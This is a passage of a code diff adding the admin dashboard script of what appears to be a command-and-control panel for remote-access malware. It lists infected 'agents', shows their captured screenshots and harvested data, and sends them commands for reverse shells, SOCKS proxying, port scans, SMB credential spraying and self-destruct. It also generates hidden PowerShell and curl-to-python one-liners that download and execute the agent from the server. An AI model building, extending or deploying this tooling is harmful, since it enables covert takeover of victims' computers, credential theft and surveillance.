+        if(oldVal) document.getElementById('global-agent-select').value = oldVal;
+        window.currentAgentId = document.getElementById('global-agent-select').value;
+    });
+}
+
+function generateReport() {
+    const aid = window.currentAgentId;
+    if (!aid) return alert("Select an agent first!");
+    window.open(`/admin/report/generate?agent_id=${aid}`, '_blank');
+}
+
+function confirmReset() {
+    if (confirm("DANGER: This will wipe all harvested data and agents. Continue?")) {
+        // Reset logic
+    }
+}
+
+function nuke(id) {
+    if(confirm("Destroy agent record?")) {
+        fetch('/admin/task', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({agent_id:id,command:'@selfdestruct'})});
+        setTimeout(() => fetch('/admin/agents/'+id,{method:'DELETE'}).then(loadAgents), 2000);
+    }
+}
+
+function loadResults() {
+    fetch('/admin/results' + (window.currentAgentId ? `?agent_id=${window.currentAgentId}` : '')).then(r => r.json()).then(results => {
+        results.forEach(res => {
+            if (!window.seenResults[res.id]) {
+                window.seenResults[res.id] = true;
+                if (res.output.startsWith('{"path":')) { try { renderFiles(JSON.parse(res.output)); } catch(e) {} }
+                else { log(res.agent_id, res.output, 'log'); log(res.agent_id, res.output, 'op-log'); }
+            }
+        });
+    });
+}
+
+function loadScreenshots() {
+    const gallery = document.getElementById('gallery');
+    gallery.innerHTML = '<div style="padding:2rem; text-align:center; color:var(--dim)">Loading intelligence...</div>';
+    
+    let url = '/admin/screenshots';
+    if (window.currentAgentId) url += '?agent_id=' + window.currentAgentId;
+    
+    fetch(url).then(r => r.json()).then(data => {
+        if (data.screenshots.length === 0) {
+            gallery.innerHTML = '<div style="padding:3rem; text-align:center; color:var(--dim); grid-column: 1/-1;">No visual data found for this agent.</div>';
+            return;
+        }
+        gallery.innerHTML = data.screenshots.map(f => `
+            <div class="gallery-item">
+                <img src="/screenshots/${f}" onclick="zoomImage('/screenshots/${f}')">
+                <p>${f}</p>
+            </div>
+        `).join('');
+    });
+}
+
+function zoomImage(src) {
+    let modal = document.getElementById('zoom-modal');
+    if (!modal) {
+        modal = document.createElement('div');
+        modal.id = 'zoom-modal';
+        modal.style = 'position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:10000; display:flex; align-items:center; justify-content:center; cursor:zoom-out;';
+        modal.onclick = () => modal.style.display = 'none';
+        document.body.appendChild(modal);
+    }
+    modal.innerHTML = `<img src="${src}" style="max-width:95%; max-height:95%; border: 2px solid var(--border); border-radius: 8px;">`;
+    modal.style.display = 'flex';
+}
+
+function nukeScreenshots() {
+    if (!confirm("Are you sure you want to PERMANENTLY DELETE all screenshots? This cannot be undone.")) return;
+    fetch('/admin/screenshots/nuke', { method: 'POST' }).then(r => r.json()).then(res => {
+        alert(res.message || "Gallery cleared.");
+        loadScreenshots();
+    });
+}
+
+function loadInfo() {
+    fetch('/admin/info').then(r => r.json()).then(info => {
+        document.getElementById('srv-url').innerText = info.full_url;
+        document.getElementById('pay-ps').innerText = `powershell -W Hidden -EP Bypass -c "iex(New-Object Net.WebClient).DownloadString('${info.full_url}/api/p/agent/ps')"`;
+        document.getElementById('pay-py-win').innerText = `powershell -W Hidden -c "(New-Object Net.WebClient).DownloadFile('${info.full_url}/api/p/agent', 'agent.py'); Start-Process pythonw -ArgumentList 'agent.py' -WindowStyle Hidden"`;
+        document.getElementById('pay-unix').innerText = `curl -s ${info.full_url}/api/p/agent | python3 -`;
+    });
+}
+
+document.getElementById('task-form').addEventListener('submit', function(e) { e.preventDefault(); if(!window.currentAgentId) return alert("Select agent."); fetch('/admin/task', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({agent_id:window.currentAgentId,command:document.getElementById('cmd-input').value})}); document.getElementById('cmd-input').value=''; });
+
+function sendOp(cmd) {
+    if(!window.currentAgentId) return alert("Select agent.");
+    let fcmd = cmd;
+    if(cmd === '@revshell') fcmd = `@revshell ${prompt("IP Port:", "192.168.1.1 4444")}`;
+    if(cmd === '@socks5') fcmd = `@socks5 ${prompt("Port:", "1080")}`;
+    fetch('/admin/task', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({agent_id:window.currentAgentId,command:fcmd})});
+}
+
+function copy(id) { navigator.clipboard.writeText(document.getElementById(id).innerText); alert("Copied."); }
+function confirmDestruct() { if(confirm("Self-Destruct?")) sendOp('@selfdestruct'); }
+
+function promptPortScan() {
+    const ip = prompt("Target IP for Port Scan:", "192.168.1.1");
+    if(ip) sendOp('@port_scan ' + ip);
+}
+function promptSmbSpray() {
+    const ip = prompt("Target IP for SMB Spray:", "192.168.1.1");
+    if(!ip) return;
+    const user = prompt("Username (leave blank for defaults):", "");
+    const pass = prompt("Password (leave blank for defaults):", "");
+    if(user && pass) sendOp(`@smb_spray ${ip} ${user} ${pass}`);
+    else sendOp('@smb_spray ' + ip);
+}
+loadInfo(); loadAgents(); setInterval(loadAgents, 5000); setInterval(loadResults, 2000);
+
+// Scroll passthrough fix: when hovering over nested scroll containers (terminal, cards),
+// forward wheel events to the page if the element is at its scroll boundary.
+document.addEventListener('wheel', function(e) {
+    let el = e.target;
+    while (el && el !== document.documentElement) {
+        const st = window.getComputedStyle(el);
+        const overflowY = st.overflowY;
+        const canScroll = (overflowY === 'auto' || overflowY === 'scroll') && el.scrollHeight > el.clientHeight;
+        if (canScroll) {
+            const atTop    = el.scrollTop === 0 && e.deltaY < 0;
+            const atBottom = el.scrollTop + el.clientHeight >= el.scrollHeight - 1 && e.deltaY > 0;
+            if (atTop || atBottom) {
+                // Element is at boundary, let page scroll instead
+                break;
+            }
+            return; // Element can scroll, let it handle it
+        }
+        el = el.parentElement;
+    }
+    // No nested scroll element handled it — scroll the page
+    window.scrollBy({ top: e.deltaY * 2, behavior: 'auto' });
+}, { passive: true });
+
+</script>
+</body>
+</html>
